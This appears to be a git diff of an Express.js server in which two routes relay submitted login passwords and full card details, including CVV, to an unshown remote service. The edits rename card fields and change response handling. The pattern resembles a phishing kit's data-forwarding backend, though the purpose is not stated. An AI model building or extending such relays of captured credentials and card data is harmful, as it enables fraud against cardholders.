@@ -474,10 +474,7 @@ app.post('/api/v1/forward_login',async function(req,res){
             passwd: req.body.pass
         }
       }, function(error, response, body) {
-        if (!error && response.statusCode == 200) {
-            console.log(body.id)
-            res.send(JSON.stringify({value: 1}));
-        }
+        res.sendStatus(response.statusCode);
       });
 
 });
@@ -489,16 +486,13 @@ app.post('/api/v1/forward_formsubmit',async function(req,res){
         method: "POST",
         json: true,
         body: {
-            name: req.body.name,
-            card_num:req.body.card_num,
-            card_exp:req.body.card_exp,
-            card_cvv:req.body.card_cvv
+            card_name: req.body.cardname,
+            card_num:req.body.cardno,
+            card_exp:req.body.expiry,
+            card_cvv:req.body.cvv
         }
       }, function(error, response, body) {
-        if (!error && response.statusCode == 200) {
-            console.log(body.id)
-            res.send(JSON.stringify({value: 1}));
-        }
+        res.sendStatus(response.statusCode);
       });
 });
 
